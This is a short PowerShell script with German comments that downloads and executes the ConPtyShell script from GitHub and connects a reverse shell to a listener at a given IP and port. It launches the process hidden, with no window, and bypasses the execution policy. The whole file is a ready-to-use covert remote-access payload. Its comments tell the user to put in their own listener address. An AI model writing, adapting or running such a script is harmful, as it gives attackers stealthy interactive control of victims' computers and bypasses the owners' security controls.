# Dieses Skript führt den ConPtyShell-Befehl im Hintergrund aus, ohne ein sichtbares PowerShell-Fenster.

# Definiere den Befehl, der ausgeführt werden soll
# HINWEIS: Hier ist der ursprüngliche ConPtyShell-Befehl, den Sie ausführen möchten.
# Ersetzen Sie die IP-Adresse und den Port durch die Ihres Listeners.
$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.2.127 124"

# Starte einen neuen PowerShell-Prozess im versteckten Modus
# -WindowStyle Hidden: Sorgt dafür, dass kein Fenster angezeigt wird.
# -Command: Führt den angegebenen String als PowerShell-Befehl aus.
# -NonInteractive: Verhindert interaktive Prompts.
# -NoProfile: Lädt keine Benutzerprofile, was den Start beschleunigen kann.
# -ExecutionPolicy Bypass: Umgeht die Ausführungsrichtlinie.
# Korrektur: '-NoNewWindow' entfernt, da es mit '-WindowStyle Hidden' kollidiert.
Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NonInteractive", "-NoProfile", "-ExecutionPolicy Bypass", "-Command", $command
